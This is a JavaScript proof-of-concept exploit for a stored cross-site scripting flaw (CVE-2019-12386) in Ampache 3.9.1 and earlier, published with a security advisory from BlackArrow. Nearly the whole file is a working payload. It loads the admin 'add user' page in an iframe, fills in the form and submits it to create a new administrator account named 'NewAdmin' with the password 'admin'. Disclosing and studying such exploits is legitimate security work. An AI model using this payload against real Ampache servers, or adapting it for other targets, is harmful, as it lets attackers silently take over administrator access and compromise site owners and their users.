/*   
     CVE-2019-12386: Stored XSS in Ampache
     
     Software: Ampache <= 3.9.1
     Author:   Juan Manuel Fernandez (@TheXC3LL) from BlackArrow
     Details:  https://github.com/blackarrowsec/advisories/new/master/2019/CVE-2019-12386
     Web:      [www.blackarrow.net] - [www.tarlogic.com]
     
     
*/

function pwned() {
    var ifr = document.getElementById("pwn");
    var target = ifr.contentDocument.getElementsByTagName("form")[2];
    target.username.value = "NewAdmin";
    target.email.value = "myemail@tarlogic.foobar";
    target.password_1.value = "admin";
    target.password_2.value = "admin";
    target.access.value = "100";
    target.submit();
}
var iframe = document.createElement('iframe');
iframe.setAttribute("src", "https://[AMPACHE]/admin/users.php?action=show_add_user");
iframe.setAttribute("id", "pwn");
document.body.appendChild(iframe);
setTimeout(pwned, 3000);
